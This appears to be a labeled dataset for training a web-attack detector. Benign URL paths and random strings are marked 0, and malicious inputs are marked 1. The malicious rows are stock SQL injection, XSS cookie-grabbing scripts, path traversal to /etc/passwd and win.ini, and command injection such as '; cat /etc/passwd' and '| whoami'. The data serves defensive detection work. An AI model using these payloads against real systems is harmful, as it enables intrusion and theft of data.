/about?id=2713,0
<script>alert(document.cookie)</script>,1
' OR 4=9 --,1
blog,0
| whoami,1
| whoami,1
/user?session=66002,0
/user?id=1469,0
onerror=alert(1),1
/cart?id=3856,0
3lvN5lMr,0
../../../../etc/passwd,1
../../../windows/win.ini,1
/profile?id=8643,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
checkout,0
javascript:alert(1),1
hIo7MIkewdF,0
/register?session=87155,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/dashboard?session=68079,0
gbptFuVIhLg,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
onerror=alert(1),1
search,0
' OR 6=7 --,1
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
s E l E c T * f R o M a d m i n,1
/register?session=45377,0
/index?id=6621,0
home,0
/register?id=8084,0
/about?session=57083,0
/checkout?session=45393,0
home,0
/index?id=6183,0
5gy1rwtkK5QeD,0
s E l E c T * f R o M a d m i n,1
<script>var a=330;alert(a)</script>,1
login,0
search,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
register,0
admin' --,1
/register?session=66134,0
r9bOJYRblYCRqG,0
z7SE8AZS,0
/dashboard?session=34645,0
<script>var a=692;alert(a)</script>,1
admin' --,1
<script>var a=603;alert(a)</script>,1
' OR 9=4 --,1
blog,0
; cat /etc/passwd,1
' OR '1'='1,1
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
9UcttyKap7l,0
' OR 5=1 --,1
admin'/* bypass */OR 1=1,1
/search?id=7032,0
/settings?id=5016,0
<script>var a=378;alert(a)</script>,1
' OR 3=1 --,1
/index?id=9247,0
1' o r '1'='1,1
<script>var a=830;alert(a)</script>,1
/profile?id=3079,0
/checkout?id=3510,0
waFgKxla,0
/cart?id=2095,0
1' o r '1'='1,1
/checkout?id=2339,0
/settings?id=2693,0
' OR 1=4 --,1
' OR 5=3 --,1
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?session=53150,0
dashboard,0
/cart?id=3197,0
' OR 1=1 --,1
<script>var a=863;alert(a)</script>,1
/search?session=73083,0
' OR 6=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
/blog?session=46333,0
/about?id=6572,0
<script>var a=109;alert(a)</script>,1
yaLA1jOsLx5,0
/checkout?session=82244,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=334;alert(a)</script>,1
onerror=alert(1),1
/login?session=97159,0
' OR 9=9 --,1
k0ygxUC0CyTP,0
/blog?id=5006,0
' OR 1=1 --,1
<script>var a=369;alert(a)</script>,1
/dashboard?id=2753,0
search,0
../../../windows/win.ini,1
' OR 5=4 --,1
admin%00' OR 1=1,1
' OR 7=6 --,1
/profile?session=98884,0
HYcBsjQTzqc,0
| whoami,1
../../../windows/win.ini,1
/about?id=4208,0
/cart?id=6325,0
../../../windows/win.ini,1
QXsBY0U0GHk8r3,0
/user?session=23866,0
settings,0
' OR 7=2 --,1
; cat /etc/passwd,1
/checkout?id=694,0
admin' --,1
/cart?id=1685,0
admin' --,1
' OR 6=7 --,1
/profile?id=4231,0
admin' --,1
' OR '1'='1,1
admin'/* bypass */OR 1=1,1
yBj5EQ2Q,0
search,0
/register?session=52661,0
' OR 1=1 --,1
FIv71Yz0oM5J2,0
<script>var a=794;alert(a)</script>,1
about,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
rPebq1E5DfzaO,0
' OR 3=3 --,1
../../../windows/win.ini,1
/register?id=2177,0
checkout,0
user,0
about,0
/user?id=8592,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
dashboard,0
GGYefHBc,0
admin%00' OR 1=1,1
/dashboard?session=67759,0
/login?id=5052,0
/blog?session=63195,0
' OR '1'='1,1
<script>var a=836;alert(a)</script>,1
' OR 1=1 --,1
profile,0
<script>var a=508;alert(a)</script>,1
| whoami,1
register,0
8OzZIfu3qBArj,0
<script>var a=823;alert(a)</script>,1
' OR 8=9 --,1
cart,0
admin'/* bypass */OR 1=1,1
index,0
s E l E c T * f R o M a d m i n,1
' OR 9=7 --,1
onerror=alert(1),1
<script>var a=43;alert(a)</script>,1
/contact?id=683,0
/profile?session=40611,0
KNuejz6A,0
/home?session=36567,0
/checkout?id=1504,0
../../../../etc/passwd,1
qc3IUGmK4Ob9F,0
<script>var a=330;alert(a)</script>,1
<script>var a=214;alert(a)</script>,1
/cart?id=4716,0
8UlYx0HZUxHz,0
home,0
/blog?session=87862,0
1' o r '1'='1,1
/settings?id=9147,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
<script>var a=398;alert(a)</script>,1
1' o r '1'='1,1
javascript:alert(1),1
ak0duGcRa7QTIJ,0
<script>var a=219;alert(a)</script>,1
c91ZX41Y6y,0
D5Pcb2roF,0
/search?id=6546,0
index,0
contact,0
CNabIbXm345kR,0
register,0
../../../windows/win.ini,1
<script>var a=324;alert(a)</script>,1
; cat /etc/passwd,1
../../../../etc/passwd,1
| whoami,1
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=3688,0
contact,0
n1ATdBNGPbIR,0
QvbmbYEvnQwP,0
../../../../etc/passwd,1
To2JhMQnsfr4rI,0
checkout,0
' OR 1=1 --,1
<script>var a=389;alert(a)</script>,1
<script>var a=387;alert(a)</script>,1
<script>var a=902;alert(a)</script>,1
javascript:alert(1),1
/register?id=505,0
admin'/* bypass */OR 1=1,1
5xfaBEANZ4,0
admin'/* bypass */OR 1=1,1
/search?id=2692,0
; cat /etc/passwd,1
<script>var a=770;alert(a)</script>,1
/blog?id=4825,0
javascript:alert(1),1
/about?session=25663,0
' OR 3=8 --,1
bRjRvlANIWP,0
/settings?session=74462,0
7agiNSfXFyvj,0
register,0
contact,0
/checkout?id=8427,0
1' o r '1'='1,1
1' o r '1'='1,1
admin%00' OR 1=1,1
/contact?id=1775,0
' OR 1=1 --,1
1' o r '1'='1,1
user,0
../../../../etc/passwd,1
settings,0
/dashboard?session=29600,0
/profile?id=3512,0
<script>var a=335;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/register?session=49185,0
qu1WpzMC5nG,0
/register?session=23273,0
9oIjdxjw3,0
/dashboard?id=3222,0
cart,0
nouUkBaOtFFSRn,0
about,0
about,0
' OR 5=8 --,1
/blog?id=5002,0
contact,0
<script>var a=130;alert(a)</script>,1
1' o r '1'='1,1
' OR 5=6 --,1
../../../../etc/passwd,1
<script>var a=820;alert(a)</script>,1
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
2Rb15Hdz,0
/about?session=85051,0
' OR 3=1 --,1
ZbsCMFnj4D,0
' OR '1'='1,1
/user?session=16715,0
<script>var a=168;alert(a)</script>,1
<script>var a=358;alert(a)</script>,1
' OR 1=3 --,1
<script>var a=92;alert(a)</script>,1
search,0
5XEewNcxE4w,0
' OR 1=1 --,1
<script>var a=760;alert(a)</script>,1
user,0
<script>var a=434;alert(a)</script>,1
<script>var a=386;alert(a)</script>,1
' OR 8=7 --,1
onerror=alert(1),1
' OR 1=9 --,1
/contact?session=57437,0
ARmAT2g5Q,0
' OR 9=9 --,1
' OR 3=4 --,1
1' o r '1'='1,1
mYGXqd5MPa,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=288;alert(a)</script>,1
' OR 2=6 --,1
../../../../etc/passwd,1
' OR '1'='1,1
<script>var a=214;alert(a)</script>,1
441bjy8OWefw,0
YSyK4sHx4WZV,0
admin' --,1
; cat /etc/passwd,1
checkout,0
/search?session=42895,0
profile,0
/user?session=40011,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=149;alert(a)</script>,1
/index?id=6295,0
1' o r '1'='1,1
/register?session=43475,0
<script>var a=650;alert(a)</script>,1
/contact?id=8618,0
/user?session=54742,0
/profile?id=9370,0
' OR 3=9 --,1
/settings?session=84882,0
| whoami,1
/index?session=31150,0
about,0
blog,0
login,0
../../../windows/win.ini,1
<script>alert(document.cookie)</script>,1
rLhG0p0YjiIAjFS,0
' OR 3=3 --,1
admin' --,1
' OR 8=8 --,1
<script>var a=265;alert(a)</script>,1
/login?session=88860,0
' OR 1=1 --,1
/home?id=8047,0
/contact?session=62483,0
/search?id=4583,0
/dashboard?session=87361,0
/register?session=89296,0
<script>var a=538;alert(a)</script>,1
/search?id=5361,0
' OR 7=7 --,1
/cart?session=65921,0
/checkout?session=40258,0
/index?session=44846,0
/checkout?id=2572,0
home,0
tcm0t1oyBnthM,0
' OR 8=8 --,1
/register?id=565,0
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?id=6643,0
/home?id=1319,0
javascript:alert(1),1
BbgNuGsUi1pkR,0
/about?session=79182,0
QW76wkJjkiI,0
../../../windows/win.ini,1
/about?id=1467,0
onerror=alert(1),1
' OR 8=3 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
/cart?id=1118,0
s E l E c T * f R o M a d m i n,1
/settings?session=33174,0
/cart?session=15132,0
ZSllLlN1w,0
' OR 9=1 --,1
/checkout?id=3519,0
/user?session=93486,0
' OR 1=1 --,1
' OR 1=2 --,1
../../../windows/win.ini,1
' OR 4=7 --,1
settings,0
' OR 5=5 --,1
index,0
checkout,0
contact,0
user,0
../../../../etc/passwd,1
r4PmmfpKDATTT6,0
| whoami,1
javascript:alert(1),1
C7FK13hgco,0
pOknl8UXeZaBp,0
<script>var a=568;alert(a)</script>,1
login,0
/register?id=6088,0
contact,0
7BgL4VGfjo,0
' OR 2=5 --,1
' OR 4=6 --,1
1' o r '1'='1,1
admin' --,1
/user?id=4353,0
2oB5YPwxqO4Alo,0
about,0
' OR 2=2 --,1
/contact?id=7924,0
' OR 3=8 --,1
/cart?id=8168,0
rL4lVTeQeQMGwKr,0
/login?session=22013,0
<script>var a=741;alert(a)</script>,1
/profile?session=75075,0
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
' OR 1=1 --,1
<script>var a=216;alert(a)</script>,1
/search?id=8502,0
<script>var a=552;alert(a)</script>,1
/profile?id=8333,0
<script>var a=752;alert(a)</script>,1
/checkout?session=40628,0
onerror=alert(1),1
<script>var a=159;alert(a)</script>,1
' OR 8=5 --,1
/dashboard?id=6252,0
s E l E c T * f R o M a d m i n,1
<script>var a=602;alert(a)</script>,1
/about?id=5855,0
contact,0
ro4r6uVuvYwR7nq,0
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=70598,0
' OR '1'='1,1
index,0
' OR '1'='1,1
/about?session=62477,0
about,0
TZACuEGAF,0
<script>var a=782;alert(a)</script>,1
/settings?session=99084,0
<script>var a=775;alert(a)</script>,1
SSExemh5aMFLt,0
XcX4lAhXnAa,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=5 --,1
/home?session=37021,0
index,0
' OR 9=3 --,1
/home?id=1803,0
/cart?session=94145,0
/user?id=6133,0
eJwq95lI,0
admin%00' OR 1=1,1
cart,0
' OR 6=1 --,1
<script>var a=833;alert(a)</script>,1
/contact?id=2918,0
admin'/* bypass */OR 1=1,1
/login?session=78314,0
zdz3BHi3Bflp,0
' OR 5=2 --,1
' OR 5=7 --,1
../../../../etc/passwd,1
/contact?id=6072,0
/register?id=808,0
/index?id=5211,0
PmJXMhTtyaKs3,0
' OR '1'='1,1
' OR '1'='1,1
login,0
about,0
../../../../etc/passwd,1
RwthxpQEM,0
/profile?id=1414,0
s E l E c T * f R o M a d m i n,1
/profile?session=14703,0
' OR 1=1 --,1
dashboard,0
QclOkdXg,0
admin%00' OR 1=1,1
/profile?session=67650,0
e4a8Z4ksqJFt,0
/cart?id=2003,0
' OR 4=6 --,1
' OR 7=4 --,1
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
onerror=alert(1),1
; cat /etc/passwd,1
<script>var a=105;alert(a)</script>,1
cart,0
/about?id=3374,0
/search?session=23263,0
<script>var a=489;alert(a)</script>,1
/register?session=79384,0
/profile?session=76133,0
index,0
| whoami,1
index,0
<script>var a=645;alert(a)</script>,1
/user?id=6740,0
dashboard,0
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=6 --,1
<script>var a=138;alert(a)</script>,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=3 --,1
4wENpxKbVf,0
<script>var a=791;alert(a)</script>,1
index,0
ajY4Msdc1b4ZM7,0
s E l E c T * f R o M a d m i n,1
hzLQjquWxXKmbDu,0
22Swcjtb,0
/home?session=20802,0
' OR 1=1 --,1
eP7wiobAK,0
dashboard,0
' OR 8=1 --,1
1' o r '1'='1,1
/dashboard?session=16514,0
../../../windows/win.ini,1
../../../../etc/passwd,1
1' o r '1'='1,1
USqEY9ldNC99,0
' OR 1=1 --,1
<script>var a=563;alert(a)</script>,1
/checkout?id=6861,0
admin%00' OR 1=1,1
| whoami,1
home,0
s E l E c T * f R o M a d m i n,1
../../../windows/win.ini,1
javascript:alert(1),1
admin' --,1
onerror=alert(1),1
/cart?session=77111,0
oMSIj1Sp6DY2R,0
cart,0
/profile?session=65529,0
/register?session=95235,0
s E l E c T * f R o M a d m i n,1
<script>var a=487;alert(a)</script>,1
| whoami,1
NW6aCtI3OG3G8d8,0
/user?id=7404,0
s E l E c T * f R o M a d m i n,1
k1ISPjG21,0
javascript:alert(1),1
/profile?session=49935,0
/search?session=76716,0
/dashboard?session=31332,0
' OR 6=4 --,1
admin'/* bypass */OR 1=1,1
/cart?session=22097,0
<script>var a=858;alert(a)</script>,1
/dashboard?session=59057,0
/cart?session=59882,0
BtiYpSDrY,0
' OR 4=6 --,1
admin'/* bypass */OR 1=1,1
<script>var a=651;alert(a)</script>,1
/register?id=6080,0
contact,0
/checkout?id=1050,0
blog,0
../../../../etc/passwd,1
<script>var a=246;alert(a)</script>,1
/user?id=1198,0
6iUVJGWH3Oev,0
<script>var a=358;alert(a)</script>,1
/profile?session=51915,0
../../../windows/win.ini,1
contact,0
rO07Y8Mi5qifE,0
1' o r '1'='1,1
<script>var a=146;alert(a)</script>,1
<script>var a=111;alert(a)</script>,1
/home?id=3246,0
<script>var a=275;alert(a)</script>,1
/checkout?session=98666,0
vILRNqjRPZ,0
/user?id=7555,0
/index?session=97077,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
settings,0
settings,0
user,0
' OR 2=7 --,1
<script>var a=981;alert(a)</script>,1
' OR 6=2 --,1
' OR 9=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?session=24911,0
' OR 1=1 --,1
admin%00' OR 1=1,1
ICpzXcGt8,0
TanY1hJK7cK,0
s E l E c T * f R o M a d m i n,1
PAY18PTVMPEDeHS,0
../../../windows/win.ini,1
/dashboard?session=87934,0
y8IurElIdB4,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin' --,1
<script>var a=353;alert(a)</script>,1
javascript:alert(1),1
ttq746zUIzV,0
../../../../etc/passwd,1
onerror=alert(1),1
user,0
/search?id=4017,0
Vk71hubLlnOdSbB,0
azcT61nEVBa9N3Z,0
javascript:alert(1),1
cart,0
/index?id=8743,0
s E l E c T * f R o M a d m i n,1
/checkout?id=5095,0
admin%00' OR 1=1,1
/dashboard?session=36450,0
/dashboard?session=93662,0
checkout,0
/register?session=78051,0
s E l E c T * f R o M a d m i n,1
WuZKSTikili,0
javascript:alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
checkout,0
' OR 3=6 --,1
admin' --,1
index,0
home,0
../../../windows/win.ini,1
' OR 7=2 --,1
s E l E c T * f R o M a d m i n,1
dashboard,0
../../../../etc/passwd,1
mPSpX7GWlmB,0
RE8ePx9EiIc,0
| whoami,1
javascript:alert(1),1
<script>var a=977;alert(a)</script>,1
<script>var a=307;alert(a)</script>,1
; cat /etc/passwd,1
/search?session=40958,0
/dashboard?id=8049,0
s E l E c T * f R o M a d m i n,1
/checkout?session=68487,0
/home?id=4120,0
admin' --,1
RetOHRqrcjPPV0J,0
/register?session=62378,0
register,0
kW2aXObRIF,0
/profile?session=87949,0
c6KBGJObu4g,0
<script>var a=203;alert(a)</script>,1
vBE5jJBt,0
raf4tku6,0
/checkout?session=33993,0
login,0
<script>var a=151;alert(a)</script>,1
' OR 8=8 --,1
<script>var a=878;alert(a)</script>,1
1' o r '1'='1,1
/cart?session=16132,0
<script>var a=410;alert(a)</script>,1
dashboard,0
admin%00' OR 1=1,1
/search?session=90140,0
/login?id=3877,0
' OR 1=1 --,1
/register?session=89583,0
' OR 9=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?id=4339,0
/home?id=4726,0
eaDJE3UOU,0
<script>var a=223;alert(a)</script>,1
/home?session=84527,0
<script>alert(document.cookie)</script>,1
/search?session=98500,0
cart,0
' OR 8=3 --,1
Q1YvYu1xk,0
profile,0
wsjW8KFZtjOfpyy,0
/cart?id=9593,0
/checkout?id=9002,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=750;alert(a)</script>,1
/blog?session=29208,0
search,0
<script>var a=930;alert(a)</script>,1
/home?session=12419,0
../../../windows/win.ini,1
/login?id=683,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
cart,0
' OR 6=1 --,1
/cart?session=63809,0
18GZw5nq,0
s E l E c T * f R o M a d m i n,1
' OR 9=4 --,1
771dN1Dj8VYFi8,0
admin'/* bypass */OR 1=1,1
<script>var a=202;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/about?id=1833,0
; cat /etc/passwd,1
<script>var a=39;alert(a)</script>,1
nQMIw4HtySH3T2,0
<script>alert(document.cookie)</script>,1
login,0
<script>var a=943;alert(a)</script>,1
' OR 6=6 --,1
OrlI1HgCgaicnc,0
<script>var a=300;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR 1=5 --,1
../../../../etc/passwd,1
admin' --,1
/contact?id=1383,0
/cart?id=5746,0
CxGoZWQyigAq,0
<script>var a=323;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?id=4406,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=4746,0
/settings?session=92316,0
<script>var a=882;alert(a)</script>,1
' OR 1=1 --,1
/register?id=7394,0
<script>var a=874;alert(a)</script>,1
aXNldyFnGEEt,0
javascript:alert(1),1
dashboard,0
/search?id=6964,0
onerror=alert(1),1
/cart?session=57910,0
/home?id=8387,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?id=2101,0
<script>var a=365;alert(a)</script>,1
zeqn2o8r,0
<script>var a=758;alert(a)</script>,1
/index?id=5778,0
<script>var a=884;alert(a)</script>,1
dashboard,0
' OR 1=8 --,1
' OR 6=8 --,1
user,0
GkXHaQcuyq,0
<script>var a=235;alert(a)</script>,1
/cart?session=55157,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
| whoami,1
../../../../etc/passwd,1
' OR 1=1 --,1
cart,0
search,0
../../../windows/win.ini,1
/settings?id=2414,0
/checkout?id=2968,0
register,0
/profile?session=57007,0
4TJsMVM3POSRY,0
' OR 9=8 --,1
/about?id=1467,0
register,0
/home?session=10073,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=316;alert(a)</script>,1
' OR 6=6 --,1
/search?session=37341,0
/checkout?id=7940,0
/profile?id=8374,0
search,0
' OR '1'='1,1
s E l E c T * f R o M a d m i n,1
<script>var a=875;alert(a)</script>,1
<script>var a=920;alert(a)</script>,1
/cart?id=6221,0
/dashboard?session=63620,0
admin'/* bypass */OR 1=1,1
cart,0
' OR '1'='1,1
onerror=alert(1),1
<script>var a=670;alert(a)</script>,1
/dashboard?session=95589,0
cart,0
/register?id=8148,0
admin'/* bypass */OR 1=1,1
/profile?id=8865,0
<script>alert(document.cookie)</script>,1
' OR 2=1 --,1
DnTjgJPN3N7GRQp,0
' OR 5=4 --,1
klD7SMmYx3Xb,0
/about?session=23518,0
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
profile,0
/login?id=233,0
/login?session=42970,0
profile,0
<script>var a=312;alert(a)</script>,1
<script>var a=349;alert(a)</script>,1
dashboard,0
ANSGwk6j7zFbPq6,0
/about?session=93030,0
/login?session=50587,0
| whoami,1
<script>var a=936;alert(a)</script>,1
../../../../etc/passwd,1
/login?id=8353,0
../../../windows/win.ini,1
Hi4YDFh24Cp,0
admin%00' OR 1=1,1
contact,0
' OR 2=9 --,1
<script>var a=734;alert(a)</script>,1
' OR 6=2 --,1
' OR 3=7 --,1
' OR 5=4 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
/profile?id=9022,0
/home?session=46815,0
' OR 9=7 --,1
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
kJzWiZmodK3y,0
' OR 8=6 --,1
/register?session=44428,0
register,0
' OR 8=1 --,1
/index?session=44140,0
dashboard,0
settings,0
<script>var a=806;alert(a)</script>,1
/search?id=1901,0
/profile?session=24323,0
/dashboard?session=67808,0
/about?session=69186,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 5=7 --,1
/profile?id=4852,0
admin%00' OR 1=1,1
../../../../etc/passwd,1
/index?id=1990,0
cart,0
| whoami,1
admin' --,1
../../../windows/win.ini,1
<script>alert(document.cookie)</script>,1
admin'/* bypass */OR 1=1,1
DO47Mn742bLNyQG,0
aCn47KwXEoiA,0
<script>var a=80;alert(a)</script>,1
javascript:alert(1),1
admin' --,1
admin%00' OR 1=1,1
admin'/* bypass */OR 1=1,1
Q73pdQac5XV,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?session=47292,0
' OR 1=6 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?id=6851,0
/blog?session=92707,0
checkout,0
<script>var a=84;alert(a)</script>,1
../../../../etc/passwd,1
IZsb5SRCR,0
/profile?id=4584,0
/profile?id=472,0
7tHu2zqyOI57,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/register?session=49137,0
/contact?id=321,0
ysxvbVA6JHNA,0
' OR 4=1 --,1
bXJPA14dTa,0
/profile?session=56541,0
/login?session=35769,0
5wV0ofOgZg,0
/index?id=3350,0
1' o r '1'='1,1
/cart?id=3603,0
caElglSOBR5K,0
qqn0xHhLw9c,0
' OR '1'='1,1
suteAq0Ygsw1Oh,0
aFTaNNpMUUiSQ77,0
<script>var a=388;alert(a)</script>,1
' OR 3=2 --,1
/checkout?session=93187,0
onerror=alert(1),1
/register?session=75759,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
' OR 1=1 --,1
/dashboard?session=87653,0
' OR 1=5 --,1
index,0
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
<script>var a=413;alert(a)</script>,1
' OR 6=2 --,1
<script>var a=930;alert(a)</script>,1
profile,0
' OR 1=1 --,1
<script>var a=429;alert(a)</script>,1
checkout,0
/profile?session=59250,0
1' o r '1'='1,1
' OR 1=1 --,1
search,0
<script>var a=917;alert(a)</script>,1
nIK8GKyGSl,0
' OR 7=8 --,1
<script>var a=931;alert(a)</script>,1
checkout,0
' OR 1=1 --,1
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 6=1 --,1
6J1iTePjVpd,0
<script>alert(document.cookie)</script>,1
home,0
onerror=alert(1),1
' OR '1'='1,1
/home?session=13108,0
/checkout?session=50404,0
settings,0
javascript:alert(1),1
<script>var a=9;alert(a)</script>,1
Mt6lBJQAPet3U,0
/home?id=8951,0
admin' --,1
/search?id=3444,0
/login?id=908,0
' OR '1'='1,1
checkout,0
lu5vgrJze,0
about,0
<script>var a=542;alert(a)</script>,1
' OR 3=6 --,1
<script>var a=586;alert(a)</script>,1
/checkout?id=4974,0
y9Pe7Au2Wp0ZD,0
<script>var a=280;alert(a)</script>,1
' OR '1'='1,1
RdXekOY6qWu,0
gm4DCcaEDp,0
javascript:alert(1),1
<script>var a=675;alert(a)</script>,1
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
' OR 3=3 --,1
/register?id=8368,0
/settings?session=80054,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
/cart?session=17615,0
contact,0
' OR 4=8 --,1
/index?id=577,0
/index?session=26935,0
profile,0
' OR 1=9 --,1
dashboard,0
/checkout?session=66105,0
/profile?id=1583,0
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
lLODvt4HSGsMoWd,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=305;alert(a)</script>,1
/blog?id=7954,0
/blog?session=31530,0
<script>var a=767;alert(a)</script>,1
yULXMy1z,0
' OR '1'='1,1
/checkout?session=56172,0
; cat /etc/passwd,1
register,0
' OR 1=8 --,1
checkout,0
contact,0
r8fTZbZn,0
; cat /etc/passwd,1
dashboard,0
blog,0
admin' --,1
; cat /etc/passwd,1
/checkout?session=44383,0
/home?id=890,0
' OR 2=4 --,1
/dashboard?id=4952,0
ggbK9MTA,0
admin%00' OR 1=1,1
xewoRuFvXiRK,0
/user?id=2755,0
' OR 8=5 --,1
<script>var a=212;alert(a)</script>,1
blog,0
' OR 2=7 --,1
<script>var a=44;alert(a)</script>,1
settings,0
<script>var a=633;alert(a)</script>,1
/contact?session=48983,0
onerror=alert(1),1
X1HDOb7dFM,0
' OR 5=1 --,1
<script>var a=333;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?id=2031,0
<script>var a=579;alert(a)</script>,1
JJeUcFbNQ,0
settings,0
contact,0
' OR '1'='1,1
/cart?session=72921,0
<script>var a=755;alert(a)</script>,1
bHMkg6vQNLZzSA,0
| whoami,1
<script>var a=997;alert(a)</script>,1
sXFKtlYF6dR,0
/user?id=5566,0
<script>var a=42;alert(a)</script>,1
' OR 9=6 --,1
/search?session=95407,0
GFotjyjEhQjSmT,0
/index?session=74618,0
s E l E c T * f R o M a d m i n,1
/settings?session=23180,0
/blog?session=25656,0
login,0
user,0
' OR 3=1 --,1
' OR 1=1 --,1
TrzGODJa,0
<script>var a=618;alert(a)</script>,1
index,0
checkout,0
../../../../etc/passwd,1
/dashboard?id=3572,0
s E l E c T * f R o M a d m i n,1
<script>var a=514;alert(a)</script>,1
1' o r '1'='1,1
/settings?session=46471,0
/blog?session=13716,0
home,0
' OR 3=6 --,1
a7V8qbk6,0
' OR 3=1 --,1
/dashboard?session=45814,0
' OR 1=1 --,1
/index?id=3626,0
' OR 9=3 --,1
s E l E c T * f R o M a d m i n,1
/dashboard?session=83925,0
/home?id=2900,0
XJgDVq7q5yROm92,0
' OR 4=9 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
gV9zd3wMVhfl,0
onerror=alert(1),1
/contact?id=5972,0
<script>alert(document.cookie)</script>,1
F0W5ArvoHhDuMvg,0
<script>var a=855;alert(a)</script>,1
PztC5bOF93l,0
/login?id=5543,0
/checkout?session=83686,0
/about?id=4076,0
' OR 8=8 --,1
/blog?id=4285,0
/register?id=2991,0
admin%00' OR 1=1,1
/index?session=88970,0
' OR 4=6 --,1
RA3gxXbpbocx,0
s E l E c T * f R o M a d m i n,1
/profile?session=70249,0
' OR 1=8 --,1
bDN9NkhYqXZu,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
javascript:alert(1),1
profile,0
/login?session=17889,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
/login?session=47383,0
<script>var a=123;alert(a)</script>,1
onerror=alert(1),1
search,0
s E l E c T * f R o M a d m i n,1
<script>var a=839;alert(a)</script>,1
javascript:alert(1),1
cart,0
/checkout?id=281,0
<script>var a=712;alert(a)</script>,1
LiJ1FDN5DMS,0
/contact?session=78429,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=486;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
rd8IviD5,0
1' o r '1'='1,1
/search?session=88818,0
' OR 7=9 --,1
' OR 9=8 --,1
/home?session=14115,0
/index?session=80053,0
' OR 1=1 --,1
/home?id=9555,0
/user?id=5270,0
javascript:alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=6 --,1
' OR 8=6 --,1
<script>alert(document.cookie)</script>,1
/login?session=19484,0
/settings?id=1836,0
index,0
<script>var a=238;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=8136,0
' OR 6=9 --,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?session=71964,0
dashboard,0
admin' --,1
; cat /etc/passwd,1
about,0
/search?id=9247,0
s E l E c T * f R o M a d m i n,1
knTmFSRgbwpM6hB,0
about,0
../../../../etc/passwd,1
../../../windows/win.ini,1
<script>var a=972;alert(a)</script>,1
' OR '1'='1,1
RGVWRebbUBytv6j,0
' OR 6=9 --,1
/user?session=82361,0
eRWsAMP0SZsbqma,0
iGzsgN7n,0
' OR 8=4 --,1
profile,0
